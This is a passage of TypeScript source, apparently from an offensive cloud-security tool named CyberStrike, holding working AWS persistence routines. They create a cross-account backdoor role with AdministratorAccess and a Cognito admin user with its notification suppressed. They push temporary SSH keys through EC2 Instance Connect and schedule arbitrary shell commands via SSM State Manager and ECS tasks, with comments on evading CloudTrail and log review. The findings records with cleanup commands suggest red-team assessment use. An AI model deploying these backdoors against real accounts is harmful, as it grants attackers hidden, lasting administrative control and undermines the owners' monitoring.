        Effect: "Allow",
        Principal: { AWS: `arn:aws:iam::${externalAccount}:root` },
        Action: "sts:AssumeRole",
      },
    ],
  })

  const create = await aws(
    [
      "iam",
      "create-role",
      "--role-name",
      roleName,
      "--assume-role-policy-document",
      trustPolicy,
      "--tags",
      "Key=CreatedBy,Value=CyberStrike",
    ],
    profile,
    region,
    timeout,
  )
  if (create.exitCode !== 0) {
    output.push(`[-] Role creation failed: ${create.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  output.push(`[+] Role created: ${roleName}`)

  const attach = await aws(
    [
      "iam",
      "attach-role-policy",
      "--role-name",
      roleName,
      "--policy-arn",
      "arn:aws:iam::aws:policy/AdministratorAccess",
    ],
    profile,
    region,
    timeout,
  )
  if (attach.exitCode === 0) output.push(`[+] AdministratorAccess attached`)

  const roleArn = tryJson(create.stdout)?.Role?.Arn
  output.push(`\n[+] From account ${externalAccount}:`)
  output.push(`    aws sts assume-role --role-arn ${roleArn} --role-session-name backdoor`)

  findings.push({
    checkId: "AWS-PERSIST-007",
    provider: "aws",
    severity: "critical",
    status: "CREATED",
    resource: `iam:role:${roleName}`,
    title: `Cross-account backdoor role: ${roleName}`,
    details: `Role trusts account ${externalAccount} with AdministratorAccess`,
    remediation: "Delete role: aws iam delete-role --role-name " + roleName,
  })

  return { output: output.join("\n"), findings }
}

export async function cognitoBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const poolId = argVal(args, "--user-pool-id")
  const username = argVal(args, "--username") || `csadmin-${Date.now().toString(36)}`
  const password = argVal(args, "--password") || `CyStr!ke${Date.now().toString(36)}`
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] Cognito User Pool Backdoor\n"]
  const findings: Finding[] = []

  if (!poolId) {
    const pools = await aws(
      ["cognito-idp", "list-user-pools", "--max-results", "20", "--query", "UserPools[].[Id,Name]"],
      profile,
      region,
      timeout,
    )
    if (pools.exitCode === 0) {
      const pl = tryJson(pools.stdout) || []
      output.push(`[+] User Pools: ${pl.length}`)
      for (const p of pl) output.push(`    ${p[0]} — ${p[1]}`)
    }
    output.push("\n[*] Use --user-pool-id to add admin user to a pool")
    return { output: output.join("\n"), findings }
  }

  const create = await aws(
    [
      "cognito-idp",
      "admin-create-user",
      "--user-pool-id",
      poolId,
      "--username",
      username,
      "--temporary-password",
      password,
      "--message-action",
      "SUPPRESS",
    ],
    profile,
    region,
    timeout,
  )
  if (create.exitCode !== 0) {
    output.push(`[-] User creation failed: ${create.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  output.push(`[+] User created: ${username}`)
  output.push(`[+] Temporary password: ${password}`)

  const setPw = await aws(
    [
      "cognito-idp",
      "admin-set-user-password",
      "--user-pool-id",
      poolId,
      "--username",
      username,
      "--password",
      password,
      "--permanent",
    ],
    profile,
    region,
    timeout,
  )
  if (setPw.exitCode === 0) output.push(`[+] Password set as permanent`)

  const groups = await aws(
    ["cognito-idp", "list-groups", "--user-pool-id", poolId, "--query", "Groups[].[GroupName,Description]"],
    profile,
    region,
    timeout,
  )
  if (groups.exitCode === 0) {
    const gl = tryJson(groups.stdout) || []
    output.push(`\n[+] Groups: ${gl.length}`)
    for (const g of gl) {
      output.push(`    ${g[0]} — ${g[1] || ""}`)
      if (/admin/i.test(g[0])) {
        const add = await aws(
          [
            "cognito-idp",
            "admin-add-user-to-group",
            "--user-pool-id",
            poolId,
            "--username",
            username,
            "--group-name",
            g[0],
          ],
          profile,
          region,
          timeout,
        )
        if (add.exitCode === 0) output.push(`    [+] Added to admin group: ${g[0]}`)
      }
    }
  }

  findings.push({
    checkId: "AWS-PERSIST-008",
    provider: "aws",
    severity: "critical",
    status: "CREATED",
    resource: `cognito:${poolId}:${username}`,
    title: `Cognito admin user backdoor: ${username}`,
    details: `Admin user created in pool ${poolId} for application-level persistence`,
    remediation: "Delete user: aws cognito-idp admin-delete-user --user-pool-id " + poolId + " --username " + username,
  })

  return { output: output.join("\n"), findings }
}

export async function ec2InstanceConnect(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const instanceId = argVal(args, "--instance-id")
  const sshKey = argVal(args, "--ssh-public-key")
  const osUser = argVal(args, "--os-user") || "ec2-user"
  const findings: Finding[] = []
  const output: string[] = ["[*] EC2 Instance Connect — SSH Key Push\n"]

  if (!instanceId && !hasFlag(args, "--enum")) {
    const instances = await aws(
      [
        "ec2",
        "describe-instances",
        "--filters",
        "Name=instance-state-name,Values=running",
        "--query",
        "Reservations[].Instances[].[InstanceId,PublicIpAddress,PrivateIpAddress,PlatformDetails,KeyName]",
      ],
      profile,
      region,
      timeout,
    )
    if (instances.exitCode === 0) {
      const il = tryJson(instances.stdout) || []
      output.push(`[+] Running instances: ${il.length}`)
      for (const i of il) {
        output.push(`  ${i[0]}  Public: ${i[1] || "none"}  Private: ${i[2]}  Platform: ${i[3]}  Key: ${i[4] || "none"}`)
      }

      for (const i of il) {
        if (!i[3]?.includes("Windows")) {
          const check = await aws(
            [
              "ec2-instance-connect",
              "send-ssh-public-key",
              "--instance-id",
              i[0],
              "--instance-os-user",
              osUser,
              "--ssh-public-key",
              "ssh-rsa AAAA_dry_run_probe",
              "--dry-run",
            ],
            profile,
            region,
            timeout,
          )
          if (check.stderr.includes("DryRunOperation")) {
            output.push(`  [+] Instance Connect available: ${i[0]}`)
            findings.push({
              checkId: "AWS-PERSIST-009",
              provider: "aws",
              severity: "high",
              status: "AVAILABLE",
              resource: `ec2:instance-connect:${i[0]}`,
              title: `EC2 Instance Connect available: ${i[0]}`,
              details: `SSH key push available — 60s window, appears as SendSSHPublicKey in CloudTrail (not SSH login)`,
              remediation: "Restrict ec2-instance-connect:SendSSHPublicKey via IAM policy",
            })
          }
        }
      }
      output.push("\n[*] Use --instance-id ID --ssh-public-key 'ssh-rsa AAAA...' to push a key")
    }
    return { output: output.join("\n"), findings }
  }

  if (!instanceId) return { output: output.join("\n") + "\n[-] --instance-id required", findings }

  if (!sshKey) {
    const tmpKey = `${process.env.TMPDIR || "/tmp"}/cs-ic-key`
    const keyGen = await Bun.spawn(["ssh-keygen", "-t", "rsa", "-b", "2048", "-f", tmpKey, "-N", "", "-q"], {
      stdout: "pipe",
      stderr: "pipe",
    }).exited
    if (keyGen === 0) {
      const pubKey = await Bun.file(`${tmpKey}.pub`).text()
      output.push(`[+] Generated temporary key pair: ${tmpKey}`)

      const push = await aws(
        [
          "ec2-instance-connect",
          "send-ssh-public-key",
          "--instance-id",
          instanceId,
          "--instance-os-user",
          osUser,
          "--ssh-public-key",
          pubKey.trim(),
        ],
        profile,
        region,
        timeout,
      )
      if (push.exitCode === 0) {
        const r = tryJson(push.stdout)
        if (r?.Success) {
          output.push(`[+] SSH key pushed successfully — 60 second window!`)
          output.push(`[+] Connect: ssh -i ${tmpKey} ${osUser}@<IP>`)
          findings.push({
            checkId: "AWS-PERSIST-012",
            provider: "aws",
            severity: "critical",
            status: "PUSHED",
            resource: `ec2:instance-connect:${instanceId}`,
            title: `SSH key pushed to ${instanceId} via Instance Connect`,
            details: `Key valid for 60s, user: ${osUser}. Appears as ec2-instance-connect:SendSSHPublicKey in CloudTrail`,
            remediation: "Revoke ec2-instance-connect:SendSSHPublicKey permission",
          })
        }
      } else {
        output.push(`[-] Push failed: ${push.stderr.trim()}`)
      }
    }
  } else {
    const push = await aws(
      [
        "ec2-instance-connect",
        "send-ssh-public-key",
        "--instance-id",
        instanceId,
        "--instance-os-user",
        osUser,
        "--ssh-public-key",
        sshKey,
      ],
      profile,
      region,
      timeout,
    )
    if (push.exitCode === 0 && tryJson(push.stdout)?.Success) {
      output.push(`[+] SSH key pushed — connect within 60s!`)
      findings.push({
        checkId: "AWS-PERSIST-013",
        provider: "aws",
        severity: "critical",
        status: "PUSHED",
        resource: `ec2:instance-connect:${instanceId}`,
        title: `SSH key pushed to ${instanceId}`,
        details: `Key valid for 60s, user: ${osUser}`,
        remediation: "Revoke ec2-instance-connect:SendSSHPublicKey permission",
      })
    } else {
      output.push(`[-] Push failed: ${push.stderr.trim()}`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function ssmStateManager(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const command = argVal(args, "--command")
  const instanceId = argVal(args, "--instance-id")
  const schedule = argVal(args, "--schedule") || "rate(1 hour)"
  const assocName = argVal(args, "--name") || `cs-state-${Date.now().toString(36).slice(-6)}`
  const findings: Finding[] = []
  const output: string[] = ["[*] SSM State Manager — Scheduled Association\n"]

  if (hasFlag(args, "--list") || !command) {
    const assocs = await aws(
      [
        "ssm",
        "list-associations",
        "--query",
        "Associations[].[AssociationId,Name,AssociationName,ScheduleExpression,Targets,LastExecutionDate]",
      ],
      profile,
      region,
      timeout,
    )
    if (assocs.exitCode === 0) {
      const al = tryJson(assocs.stdout) || []
      output.push(`[+] Existing associations: ${al.length}`)
      for (const a of al) {
        output.push(`  ${a[2] || a[0]}  Doc: ${a[1]}  Schedule: ${a[3] || "none"}  LastRun: ${a[5] || "never"}`)
        const targets = a[4] || []
        for (const t of targets) output.push(`    Target: ${t.Key}=${t.Values?.join(",")}`)

        if (String(a[2] || "").startsWith("cs-")) {
          findings.push({
            checkId: "AWS-PERSIST-010",
            provider: "aws",
            severity: "high",
            status: "FOUND",
            resource: `ssm:association:${a[0]}`,
            title: `CyberStrike SSM association found: ${a[2]}`,
            details: `Document: ${a[1]}, Schedule: ${a[3]}`,
            remediation: `Delete: aws ssm delete-association --association-id ${a[0]}`,
          })
        }
      }
    }

    if (!command) {
      output.push("\n[*] Use --command CMD --instance-id ID [--schedule 'rate(1 hour)'] to create persistence")
      return { output: output.join("\n"), findings }
    }
  }

  if (!instanceId) return { output: output.join("\n") + "\n[-] --instance-id required", findings }

  const createDoc = await aws(
    [
      "ssm",
      "create-association",
      "--name",
      "AWS-RunShellScript",
      "--association-name",
      assocName,
      "--targets",
      `Key=instanceids,Values=${instanceId}`,
      "--parameters",
      `commands=["${command.replace(/"/g, '\\"')}"]`,
      "--schedule-expression",
      schedule,
      "--compliance-severity",
      "UNSPECIFIED",
    ],
    profile,
    region,
    timeout,
  )

  if (createDoc.exitCode === 0) {
    const r = tryJson(createDoc.stdout)
    output.push(`[+] Association created: ${assocName}`)
    output.push(`    ID: ${r?.AssociationDescription?.AssociationId}`)
    output.push(`    Schedule: ${schedule}`)
    output.push(`    Target: ${instanceId}`)
    output.push(`    Command: ${command}`)
    output.push(`\n[*] More stealth than EventBridge — appears as normal SSM compliance`)

    findings.push({
      checkId: "AWS-PERSIST-014",
      provider: "aws",
      severity: "critical",
      status: "CREATED",
      resource: `ssm:association:${assocName}`,
      title: `SSM State Manager persistence: ${assocName}`,
      details: `Scheduled ${schedule} on ${instanceId}: ${command}`,
      remediation: `Delete: aws ssm delete-association --association-name ${assocName}`,
    })
  } else {
    output.push(`[-] Failed: ${createDoc.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function ecsScheduledTask(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const cluster = argVal(args, "--cluster")
  const taskDef = argVal(args, "--task-definition")
  const schedule = argVal(args, "--schedule") || "rate(1 hour)"
  const command = argVal(args, "--command")
  const ruleName = argVal(args, "--rule-name") || `cs-ecs-${Date.now().toString(36).slice(-6)}`
  const findings: Finding[] = []
  const output: string[] = ["[*] ECS Scheduled Task — Serverless Persistence\n"]

  if (hasFlag(args, "--list") || !cluster) {
    const rules = await aws(
      ["events", "list-rules", "--query", "Rules[?starts_with(Name,'cs-ecs')].[Name,ScheduleExpression,State]"],
      profile,
      region,
      timeout,
    )
    if (rules.exitCode === 0) {
      const rl = tryJson(rules.stdout) || []
      if (rl.length) {
        output.push(`[+] Existing CyberStrike ECS scheduled rules: ${rl.length}`)
        for (const r of rl) output.push(`  ${r[0]}  Schedule: ${r[1]}  State: ${r[2]}`)
      }
    }

    const clusters = await aws(["ecs", "list-clusters", "--query", "clusterArns"], profile, region, timeout)
    if (clusters.exitCode === 0) {
      const cl = tryJson(clusters.stdout) || []
      output.push(`\n[+] Available clusters: ${cl.length}`)
      for (const c of cl) output.push(`  ${String(c).split("/").pop()}`)
    }

    const taskDefs = await aws(
      ["ecs", "list-task-definitions", "--sort", "DESC", "--max-items", "10", "--query", "taskDefinitionArns"],
      profile,
      region,
      timeout,
    )
    if (taskDefs.exitCode === 0) {
      const tl = tryJson(taskDefs.stdout) || []
      output.push(`\n[+] Recent task definitions (latest 10):`)
      for (const t of tl) output.push(`  ${String(t).split("/").pop()}`)
    }

    if (!cluster) {
      output.push(
        "\n[*] Usage: awshook ecs_scheduled_task --cluster NAME --task-definition DEF [--command CMD] [--schedule 'rate(1 hour)']",
      )
      return { output: output.join("\n"), findings }
    }
  }

  if (!taskDef) {
    output.push("[-] --task-definition required")
    return { output: output.join("\n"), findings }
  }

  const ruleCreate = await aws(
    [
      "events",
      "put-rule",
      "--name",
      ruleName,
      "--schedule-expression",
      schedule,
      "--state",
      "ENABLED",
      "--description",
      "CyberStrike ECS scheduled task",
    ],
    profile,
    region,
    timeout,
  )
  if (ruleCreate.exitCode !== 0) {
    output.push(`[-] Failed to create rule: ${ruleCreate.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  const ruleArn = tryJson(ruleCreate.stdout)?.RuleArn
  output.push(`[+] EventBridge rule created: ${ruleName}`)
  output.push(`    Schedule: ${schedule}`)
  output.push(`    ARN: ${ruleArn}`)

  const clusterArn = cluster.startsWith("arn:") ? cluster : `arn:aws:ecs:${region || "us-east-1"}:*:cluster/${cluster}`
  const overrides = command
    ? `,\"EcsParameters\":{\"TaskDefinitionArn\":\"${taskDef}\",\"TaskCount\":1,\"LaunchType\":\"FARGATE\",\"NetworkConfiguration\":{\"awsvpcConfiguration\":{\"Subnets\":[\"auto\"],\"AssignPublicIp\":\"ENABLED\"}}},\"Input\":\"{\\\"containerOverrides\\\":[{\\\"name\\\":\\\"main\\\",\\\"command\\\":[\\\"sh\\\",\\\"-c\\\",\\\"${command.replace(/"/g, '\\\\"')}\\\"]}]}\"`
    : ""

  const targetInput = `[{"Id":"cs-target","Arn":"${clusterArn}","RoleArn":"${ruleArn}"${overrides}}]`

  const targetCreate = await aws(
    [
      "events",
      "put-targets",
      "--rule",
      ruleName,
      "--targets",
      `Id=cs-target,Arn=${clusterArn},EcsParameters={TaskDefinitionArn=${taskDef},TaskCount=1,LaunchType=FARGATE}`,
    ],
    profile,
    region,
    timeout,
  )
  if (targetCreate.exitCode === 0) {
    output.push(`[+] ECS target attached: ${taskDef}`)
    output.push(`    Cluster: ${cluster}`)
    if (command) output.push(`    Command override: ${command}`)
    output.push(`\n[*] Advantages over EventBridge Lambda:`)
    output.push(`    - Runs as Fargate task (serverless, no EC2)`)
    output.push(`    - Logs go to task's log group, not Lambda`)
    output.push(`    - Can run in target VPC for network access`)
    output.push(`    - Task role separate from execution role`)
  } else {
    output.push(`[*] Target attachment needs manual config (ECS target requires subnet/SG):`)
    output.push(`    aws events put-targets --rule ${ruleName} --targets '${targetInput}'`)
  }

  findings.push({
    checkId: "AWS-PERSIST-011",
    provider: "aws",
    severity: "critical",
    status: "CREATED",
    resource: `ecs:scheduled:${ruleName}`,
    title: `ECS scheduled task persistence: ${ruleName}`,
    details: `Schedule: ${schedule}, Task: ${taskDef}, Cluster: ${cluster}${command ? `, Cmd: ${command}` : ""}`,
    remediation: `Delete: aws events remove-targets --rule ${ruleName} --ids cs-target && aws events delete-rule --name ${ruleName}`,
  })

  return { output: output.join("\n"), findings }
}
